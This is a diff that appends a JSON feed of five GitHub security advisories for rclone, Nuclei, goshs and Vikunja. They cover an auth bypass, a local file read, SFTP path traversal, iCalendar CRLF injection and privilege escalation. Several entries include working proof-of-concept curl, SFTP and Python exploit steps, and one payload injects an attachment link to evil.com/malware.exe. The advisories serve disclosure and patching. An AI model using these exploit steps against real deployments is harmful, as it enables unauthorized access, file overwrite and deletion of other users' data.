@@ -663,3 +663,415 @@
     }
   }
 ]
+[Mon Jun  8 20:24:46 UTC 2026] Latest CVEs:
+[
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-25qr-6mpr-f7qx",
+    "modified": "2026-06-08T20:09:49Z",
+    "published": "2026-04-22T14:44:13Z",
+    "aliases": [
+      "CVE-2026-41176"
+    ],
+    "summary": "Rclone: Unauthenticated options/set allows runtime auth bypass, leading to sensitive operations and command execution",
+    "details": "### Summary\nThe RC endpoint `options/set` is exposed without `AuthRequired: true`, but it can mutate global runtime configuration, including the RC option block itself. An unauthenticated attacker can set `rc.NoAuth=true`, which disables the authorization gate for many RC methods registered with `AuthRequired: true` on reachable RC servers that are started without global HTTP authentication. This can lead to unauthorized access to sensitive administrative functionality, including configuration and operational RC methods.\n\n### Preconditions\n\nPreconditions for this vulnerability are:\n\n- The rclone remote control API **must** be enabled, either by the `--rc` flag or by running the `rclone rcd` server\n- The remote control API **must** be reachable by the attacker - by default rclone only serves the rc to localhost unless the `--rc-addr` flag is in use\n- The rc must have been deployed **without** global RC HTTP authentication - so not using `--rc-user`/`--rc-pass`/`--rc-htpasswd`/etc\n\n### Details\nThe root cause is present from v1.45 onward. Some higher-impact exploitation paths became available in later releases as additional RC functionality was introduced.\n\nThe issue is caused by two properties of the RC implementation:\n\n1. `options/set` is exposed without `AuthRequired: true`\n2. the RC server enforces authorization for `AuthRequired` calls using the mutable runtime value `s.opt.NoAuth`\n\nRelevant code paths:\n\n- [`fs/rc/config.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/config.go)\n  - registers `options/set` without `AuthRequired: true`\n  - `rcOptionsSet` reshapes attacker-controlled input into global option blocks\n\n- [`fs/rc/rcserver/rcserver.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/rcserver/rcserver.go)\n  - request handling checks:\n    - `if !s.opt.NoAuth && call.AuthRequired && !s.server.UsingAuth()`\n  - once `rc.NoAuth` is changed to `true`, later `AuthRequired` methods become callable without credentials\n\nThis creates a runtime auth-bypass primitive on the RC interface.\n\nAfter setting `rc.NoAuth=true`, previously protected administrative methods become callable, including configuration and operational endpoints such as:\n\n- `config/listremotes`\n- `config/dump`\n- `config/get`\n- `operations/list`\n- `operations/copyfile`\n- `core/command`\n\nRelevant code for the second-stage command execution path:\n\n- [`fs/metadata.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/metadata.go)\n  - `metadataMapper()` uses `exec.Command(...)`\n\n- [`fs/operations/rc.go`](https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/operations/rc.go)\n  - `operations/copyfile` is normally `AuthRequired: true`\n  - once `rc.NoAuth=true`, it becomes reachable without credentials\n\nThis was validating using the following:\n- current `master` as of 2026-04-14: `bf55d5e6d37fd86164a87782191f9e1ffcaafa82`\n- latest public release tested locally: `v1.73.4`\n\nThe issue was also verified on a public amd64 Ubuntu host controlled by the tester, using direct host execution (not containerized PoC execution).\n\n### PoC\n#### Minimal reproduction\nStart a vulnerable server:\n\n```bash\nrclone rcd --rc-addr 127.0.0.1:5572\n```\n\nNo `--rc-user`, no `--rc-pass`, no `--rc-htpasswd`.\n\nFirst confirm that a protected RC method is initially blocked:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:5572/config/listremotes \\\n  -H 'Content-Type: application/json' \\\n  --data '{}'\n```\n\nExpected result: HTTP 403.\n\nUse unauthenticated `options/set` to disable the auth gate:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:5572/options/set \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"rc\":{\"NoAuth\":true}}'\n```\n\nExpected result: HTTP 200 `{}`\n\nThen call the same protected method again without credentials:\n\n```bash\ncurl -sS -X POST http://127.0.0.1:5572/config/listremotes \\\n  -H 'Content-Type: application/json' \\\n  --data '{}'\n```\n\nExpected result: HTTP 200 with a JSON response such as:\n\n```json\n{\"remotes\":[]}\n```\n\n#### Testing performed\nThis was successfully reproduced:\n- on the tester's ocal test environment\n- on a public amd64 Ubuntu host controlled by the tester\n\nUsing the public host, the following was confirmed:\n\n- unauthenticated `options/set` successfully set `rc.NoAuth=true`\n- previously protected RC methods became callable without credentials\n- the issue was reproducible through direct host execution\n\n### Impact\nThis is an authorization bypass on the RC administrative interface.\n\nIt can allow an unauthenticated network attacker, on a reachable RC deployment without global HTTP authentication, to disable the intended auth boundary for protected RC methods and gain access to sensitive configuration and operational functionality.\n\nDepending on the enabled RC surface and runtime configuration, this can further enable higher-impact outcomes such as local file read, credential/config disclosure, filesystem enumeration, and command execution.",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "github.com/rclone/rclone"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.45.0"
+              },
+              {
+                "fixed": "1.73.5"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/rclone/rclone/security/advisories/GHSA-25qr-6mpr-f7qx"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41176"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/rclone/rclone"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/config.go"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/rclone/rclone/blob/bf55d5e6d37fd86164a87782191f9e1ffcaafa82/fs/rc/rcserver/rcserver.go"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-306"
+      ],
+      "severity": "CRITICAL",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-04-22T14:44:13Z",
+      "nvd_published_at": "2026-04-23T00:16:45Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-25qr-6mpr-f7qx"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-29rg-wmcw-hpf4",
+    "modified": "2026-06-08T20:09:36Z",
+    "published": "2026-04-22T19:58:47Z",
+    "aliases": [
+      "CVE-2026-41646"
+    ],
+    "summary": "Nuclei: Local File Read via require() Module Loader Bypass",
+    "details": "A vulnerability in Nuclei's JavaScript protocol runtime allows JavaScript templates to read local `.js` and `.json` files through the `require()` function, bypassing the default local file access restriction.\n\n**Affected Component**\n\nThe issue is in the JavaScript runtime's module loading system. The goja `require()` function used a default host filesystem loader without routing through the `allow-local-file-access` check.\n\n**Description**\n\nThe goja require() function in Nuclei's JavaScript protocol runtime used the default host filesystem loader, which allowed JavaScript templates to import .js and .json files from anywhere on the host filesystem, ignoring the allow-local-file-access (-lfa) option that controls file access outside the template directory.\n\nThe impact is limited to `.js` and `.json` files, as goja's module loader only resolves those extensions. That said, this is still enough to expose sensitive data stored in JSON configuration files like `package.json`, credential stores, or cloud configuration files sitting on the host filesystem.\n\n**Affected Users**\n\n- **CLI users** running untrusted or third-party JavaScript templates.\n- **SDK users** who have integrated Nuclei into platforms where end-users can supply JavaScript templates, especially when relying on the default file access restriction to limit filesystem reads.\n\n> [!NOTE]\nThe `require()` module loader only resolves `.js` and `.json` files. Other file types cannot be read through this vector.\n\n**Patches**\n\n- The vulnerability is fixed in Nuclei v3.8.0. Upgrading is strongly recommended. \n- Fix reference: #7332\n\n**Mitigation**\n\nUpgrade to Nuclei v3.8.0, where the `require()` registry is rebuilt per execution and file-backed module loads are routed through the same `allow-local-file-access` check as the rest of the filesystem operations.\n\nIn the meantime, avoid running JavaScript templates from unverified sources.\n\n**Workarounds**\n\nIf upgrading is not an option, avoid running untrusted JavaScript templates entirely. There is no flag or configuration that mitigates this on affected versions.\n\n**Acknowledgments**\n\nNuceli thanks @AkashHamal0x01 for reporting this issue through responsible disclosure via security@projectdiscovery.io",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "github.com/projectdiscovery/nuclei/v3"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.0.0"
+              },
+              {
+                "fixed": "3.8.0"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-29rg-wmcw-hpf4"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41646"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/projectdiscovery/nuclei/pull/7332"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/projectdiscovery/nuclei/commit/6f2ade6a9b427c284c15a43445f9c7f055e60e5d"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/projectdiscovery/nuclei"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-284"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-04-22T19:58:47Z",
+      "nvd_published_at": "2026-05-08T04:16:18Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-29rg-wmcw-hpf4"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-2943-crp8-38xx",
+    "modified": "2026-06-08T20:08:46Z",
+    "published": "2026-04-10T20:00:28Z",
+    "aliases": [
+      "CVE-2026-40188"
+    ],
+    "summary": "goshs is Missing Write Protection for Parametric Data Values",
+    "details": "### Summary\nThe SFTP command rename sanitizes only the source path and not the destination, so it is possible to write outside of the root directory of the SFTP. \n\n### Details\n\nHere is the issue:\n```go\n// helper.go:155-215\nfunc cmdFile(root string, r *sftp.Request, ip string, sftpServer *SFTPServer) error {\n    fullPath, err := sanitizePath(r.Filepath, root)  // Source: SANITIZED\n    if err != nil {\n        return err\n    }\n    switch r.Method {\n    // ...\n    case \"Rename\":\n        err := os.Rename(fullPath, r.Target)  // Destination: NOT SANITIZED!\n```\n\n\n### PoC\n\nTo exploit just upload a file on the SFTP and rename it to a file with full path. \n\nCurrently no key.txt file inside /tmp\n\n``` bash\n$ ls key.txt\nls: key.txt: No such file or directory\n```\n\n\nStart the SFTP server:\n``` bash\n/tmp/sftp-server $ goshs -sftp -b 'user:user' -d .\nWARNING[2026-04-02 20:00:18] upload-folder mode deactivated due to use of 'sftp' mode\nWARNING[2026-04-02 20:00:18] There is a newer Version (v2.0.0-beta.3) of goshs available. Run --update to update goshs.\nINFO   [2026-04-02 20:00:18] Starting SFTP server on port 0.0.0.0:2022\nWARNING[2026-04-02 20:00:18] You are using basic auth without SSL. Your credentials will be transferred in cleartext. Consider using -s, too.\nINFO   [2026-04-02 20:00:18] Using basic auth with user 'user' and password 'user'\nINFO   [2026-04-02 20:00:18] Download embedded file at: /example.txt?embedded\nINFO   [2026-04-02 20:00:18] Serving on interface lo0 bound to 127.0.0.1:8000\nINFO   [2026-04-02 20:00:18] Serving on interface en0 bound to 192.168.68.51:8000\nINFO   [2026-04-02 20:00:18] Serving HTTP from /tmp/sftp-server\n```\n\nConnect to the SFTP and uploading the file:\n``` bash\n$ sftp -P 2022 user@localhost\nuser@localhost's password:\nConnected to localhost.\nsftp> put /Users/user/Downloads/key.txt\nUploading /Users/user/Downloads/key.txt to /tmp/sftp-server/key.txt\nkey.txt                                                                                                                                                   100%   15    40.9KB/s   00:00\n```\n\nThe file is stored properly. \n\ngoshs log:\n```\nINFO   [2026-04-02 20:03:31] SFTP: [::1]:61742 - [Put] - \"/tmp/sftp-server/key.txt\"\n```\n\nRename command with full path:\n``` bash\nsftp> rename key.txt /tmp/key.txt\n```\n\ngoshs log:\n```\nINFO   [2026-04-02 20:04:09] SFTP: [::1]:61742 - [Rename] - \"/tmp/sftp-server/key.txt to /tmp/key.txt\"\n```\n\nKey file is now in /tmp\n```\n$ ls key.txt\nkey.txt\n```\n\n\n### Impact\nThis allows file write and can be used either for an RCE in form of overwrite an SSH key, or by overwriting a configuration etc.",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "github.com/patrickhener/goshs"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.0.7"
+              },
+              {
+                "last_affected": "1.1.4"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/patrickhener/goshs/security/advisories/GHSA-2943-crp8-38xx"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-40188"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/patrickhener/goshs/commit/141c188ce270ffbec087844a50e5e695b7da7744"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/patrickhener/goshs"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1314"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-04-10T20:00:28Z",
+      "nvd_published_at": "2026-04-10T20:16:23Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-2943-crp8-38xx"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-2g7h-7rqr-9p4r",
+    "modified": "2026-06-08T20:08:35Z",
+    "published": "2026-04-10T15:35:05Z",
+    "aliases": [
+      "CVE-2026-35601"
+    ],
+    "summary": "Vikunja has iCalendar Property Injection via CRLF in CalDAV Task Output",
+    "details": "## Summary\n\nThe CalDAV output generator builds iCalendar VTODO entries via raw string concatenation without applying RFC 5545 TEXT value escaping. User-controlled task titles containing CRLF characters break the iCalendar property boundary, allowing injection of arbitrary iCalendar properties such as `ATTACH`, `VALARM`, or `ORGANIZER`.\n\n## Details\n\nThe `ParseTodos` function at `pkg/caldav/caldav.go:146` concatenates the task summary directly into the iCalendar output:\n\n```go\nSUMMARY:` + t.Summary + getCaldavColor(t.Color)\n```\n\nRFC 5545 Section 3.3.11 requires TEXT property values to escape newlines as `\\n`, semicolons as `\\;`, commas as `\\,`, and backslashes as `\\\\`. None of these escaping rules are applied to `Summary`, `Categories`, `UID`, project name, or alarm `Description` fields.\n\nGo's JSON decoder preserves literal CR/LF bytes in string values, so task titles created via the REST API retain CRLF characters. When these tasks are served via CalDAV, the newlines break the `SUMMARY` property and the subsequent text is parsed by CalDAV clients as independent iCalendar properties.\n\n## Proof of Concept\n\nTested on Vikunja v2.2.2.\n\n```python\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\nTARGET = \"http://localhost:3456\"\nAPI = f\"{TARGET}/api/v1\"\n\ntoken = requests.post(f\"{API}/login\",\n    json={\"username\": \"alice\", \"password\": \"Alice1234!\"}).json()[\"token\"]\nh = {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\nproj = requests.put(f\"{API}/projects\", headers=h, json={\"title\": \"CalDAV Test\"}).json()\n\n# create task with CRLF injection in title\ntask = requests.put(f\"{API}/projects/{proj['id']}/tasks\", headers=h, json={\n    \"title\": \"Meeting\\r\\nATTACH:https://evil.com/malware.exe\\r\\nX-INJECTED:pwned\"\n}).json()\n\n# set UID (normally done by CalDAV sync; here via sqlite for PoC)\n# sqlite3 vikunja.db \"UPDATE tasks SET uid='inject-test-001' WHERE id={task['id']};\"\nTASK_UID = \"inject-test-001\"\n\n# fetch via CalDAV\ncaldav_token = requests.put(f\"{API}/user/settings/token/caldav\", headers=h).json()[\"token\"]\nr = requests.get(f\"{TARGET}/dav/projects/{proj['id']}/{TASK_UID}.ics\",\n                 auth=HTTPBasicAuth(\"alice\", caldav_token))\nprint(r.text)\n```\n\nOutput:\n```\nBEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VTODO\nUID:inject-test-001\nDTSTAMP:20260327T130452Z\nSUMMARY:Meeting\nATTACH:https://evil.com/malware.exe\nX-INJECTED:pwned\nCREATED:20260327T130452Z\nLAST-MODIFIED:20260327T130452Z\nEND:VTODO\nEND:VCALENDAR\n```\n\nThe `ATTACH` and `X-INJECTED` lines appear as separate, valid iCalendar properties. CalDAV clients will parse these as legitimate properties.\n\n## Impact\n\nAn authenticated user with write access to a shared project can create tasks with CRLF-injected titles via the REST API. When other users sync via CalDAV, the injected properties take effect in their calendar clients. This enables:\n- Injecting malicious attachment URLs (`ATTACH`) that clients may auto-download or display\n- Creating fake alarm notifications (`VALARM`) for social engineering\n- Spoofing organizer identity (`ORGANIZER`)\n\n## Recommended Fix\n\nApply RFC 5545 TEXT value escaping to all user-controlled fields:\n\n```go\nfunc escapeICal(s string) string {\n    s = strings.ReplaceAll(s, \"\\\\\", \"\\\\\\\\\")\n    s = strings.ReplaceAll(s, \";\", \"\\\\;\")\n    s = strings.ReplaceAll(s, \",\", \"\\\\,\")\n    s = strings.ReplaceAll(s, \"\\n\", \"\\\\n\")\n    s = strings.ReplaceAll(s, \"\\r\", \"\")\n    return s\n}\n```\n\nApply `escapeICal()` to `t.Summary`, `config.Name`, `t.Categories` items, `a.Description`, `t.UID`, and `r.UID`.\n\n---\n*Found and reported by [aisafe.io](https://aisafe.io)*",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "code.vikunja.io/api"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.3.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.2.2"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2g7h-7rqr-9p4r"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35601"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/pull/2580"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/go-vikunja/vikunja"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-93"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-04-10T15:35:05Z",
+      "nvd_published_at": "2026-04-10T17:17:03Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-2g7h-7rqr-9p4r"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "schema_version": "1.4.0",
+    "id": "GHSA-2vq4-854f-5c72",
+    "modified": "2026-06-08T20:08:25Z",
+    "published": "2026-04-10T15:33:50Z",
+    "aliases": [
+      "CVE-2026-35595"
+    ],
+    "summary": "Vikunja vulnerable to Privilege Escalation via Project Reparenting",
+    "details": "## Summary\n\nA user with Write-level access to a project can escalate their permissions to Admin by moving the project under a project they own. After reparenting, the recursive permission CTE resolves ownership of the new parent as Admin on the moved project. The attacker can then delete the project, manage shares, and remove other users' access.\n\n## Details\n\nThe `CanUpdate` check at `pkg/models/project_permissions.go:139-148` only requires `CanWrite` on the new parent project when changing `parent_project_id`. However, Vikunja's permission model uses a recursive CTE that walks up the project hierarchy to compute permissions. Moving a project under a different parent changes the permission inheritance chain.\n\nWhen a user has inherited Write access (from a parent project share) and reparents the child project under their own project tree, the CTE resolves their ownership of the new parent as Admin (permission level 2) on the moved project.\n\n```go\nif p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {\n    newProject := &Project{ID: p.ParentProjectID}\n    can, err := newProject.CanWrite(s, a)  // Only checks Write, not Admin\n    if err != nil {\n        return false, err\n    }\n    if !can {\n        return false, ErrGenericForbidden{}\n    }\n}\n```\n\n## Proof of Concept\n\nTested on Vikunja v2.2.2.\n\n```\n1. victim creates \"Parent Project\" (id=3)\n2. victim creates \"Secret Child\" (id=4) under Parent Project\n3. victim shares Parent Project with attacker at Write level (permission=1)\n   -> attacker inherits Write on Secret Child (no direct share)\n4. attacker creates own \"Attacker Root\" project (id=5)\n5. attacker verifies: DELETE /api/v1/projects/4 -> 403 Forbidden\n6. attacker sends: POST /api/v1/projects/4 {\"title\":\"Secret Child\",\"parent_project_id\":5}\n   -> 200 OK (reparenting succeeds, only requires Write)\n7. attacker sends: DELETE /api/v1/projects/4 -> 200 OK\n   -> Project deleted. victim gets 404.\n```\n\n```python                                                                                                                                                                                                                                                                                                        \nimport requests                                                                                                                                                                                                                                                                                                    \n                                                                                                                                                                                                                                                                                                                \nTARGET = \"http://localhost:3456\"                                                                                                                                                                                                                                                                                 \nAPI = f\"{TARGET}/api/v1\"  \n                                        \ndef login(u, p):                     \n    return requests.post(f\"{API}/login\", json={\"username\": u, \"password\": p}).json()[\"token\"]\n                                        \ndef h(token):  \n    return {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n                                                                                                                                                                                                                                                                                                                    \nvictim_token = login(\"victim\", \"Victim123!\")\nattacker_token = login(\"attacker\", \"Attacker123!\")                                                                                                                                                                                                                                                                 \n                                                                                                                                                                                                                                                                                                                \n# victim creates parent -> child project hierarchy                                                                                                                                                                                                                                                               \nparent = requests.put(f\"{API}/projects\", headers=h(victim_token),\n                    json={\"title\": \"Parent Project\"}).json()\nchild = requests.put(f\"{API}/projects\", headers=h(victim_token),\n                    json={\"title\": \"Secret Child\", \"parent_project_id\": parent[\"id\"]}).json()\n\n# victim shares parent with attacker at Write (attacker inherits Write on child)\nrequests.put(f\"{API}/projects/{parent['id']}/users\", headers=h(victim_token),\n            json={\"username\": \"attacker\", \"permission\": 1})\n\n# attacker creates own root project\nown = requests.put(f\"{API}/projects\", headers=h(attacker_token),\n                    json={\"title\": \"Attacker Root\"}).json()\n\n# before: attacker cannot delete child\nr = requests.delete(f\"{API}/projects/{child['id']}\", headers=h(attacker_token))\nprint(f\"DELETE before reparent: {r.status_code}\")  # 403\n\n# exploit: reparent child under attacker's project\nr = requests.post(f\"{API}/projects/{child['id']}\", headers=h(attacker_token),\n                json={\"title\": \"Secret Child\", \"parent_project_id\": own[\"id\"]})\nprint(f\"Reparent: {r.status_code}\")  # 200\n\n# after: attacker can now delete child\nr = requests.delete(f\"{API}/projects/{child['id']}\", headers=h(attacker_token))\nprint(f\"DELETE after reparent: {r.status_code}\")  # 200 - escalated to Admin\n\n# victim lost access\nr = requests.get(f\"{API}/projects/{child['id']}\", headers=h(victim_token))\nprint(f\"Victim access: {r.status_code}\")  # 404 - project gone\n```\n\nOutput:\n```\nDELETE before reparent: 403\nReparent: 200\nDELETE after reparent: 200\nVictim access: 404\n```\n\nThe attacker escalated from inherited Write to Admin by reparenting, then deleted the victim's project.\n\n## Impact\n\nAny user with Write permission on a shared project can escalate to full Admin by moving the project under their own project tree via a single API call. After escalation, the attacker can delete the project (destroying all tasks, attachments, and history), remove other users' access, and manage sharing settings. This affects any project where Write access has been shared with collaborators.\n\n## Recommended Fix\n\nRequire Admin permission instead of Write when changing `parent_project_id`:\n\n```go\nif p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {\n    newProject := &Project{ID: p.ParentProjectID}\n    can, err := newProject.IsAdmin(s, a)\n    if err != nil {\n        return false, err\n    }\n    if !can {\n        return false, ErrGenericForbidden{}\n    }\n    canAdmin, err := p.IsAdmin(s, a)\n    if err != nil {\n        return false, err\n    }\n    if !canAdmin {\n        return false, ErrGenericForbidden{}\n    }\n}\n```\n\n---\n*Found and reported by [aisafe.io](https://aisafe.io)*",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "ecosystem": "Go",
+          "name": "code.vikunja.io/api"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.3.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.2.2"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2vq4-854f-5c72"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35595"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/pull/2583"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/commit/c03d682f48aff890eeb3c8b41d38226069722827"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/go-vikunja/vikunja"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-269"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-04-10T15:33:50Z",
+      "nvd_published_at": "2026-04-10T17:17:02Z"
+    },
+    "containers": {
+      "cna": {
+        "x_gcve": [
+          {
+            "recordType": "advisory",
+            "vulnId": "ghsa-2vq4-854f-5c72"
+          }
+        ]
+      }
+    }
+  }
+]
